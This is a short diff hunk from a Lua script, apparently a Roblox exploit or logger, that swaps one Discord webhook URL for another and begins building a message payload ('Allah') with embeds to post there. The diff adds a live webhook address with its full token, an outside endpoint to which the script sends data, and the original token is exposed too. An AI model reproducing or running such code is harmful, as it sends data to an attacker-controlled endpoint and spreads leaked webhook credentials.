@@ -8,7 +8,7 @@ local webhookcheck =
    "Kid with shit exploit"
 
 local url =
-   "https://discord.com/api/webhooks/1067401256026513449/Y3kq3ifed5W--OyW8ag80MsXfbeBdEWfgxU-cY9SZoxiDhVA7HYWLZpSApR-4ZDeRu3u"
+   "https://canary.discord.com/api/webhooks/1067861667016347679/paDioOIH6snfp7ww85_qQylVu7HCwh7VZLhhLt5p5SiKcZkXqa1wWqpqk3rkEGII4WTl"
 local data = {
    ["content"] = "Allah",
    ["embeds"] = {
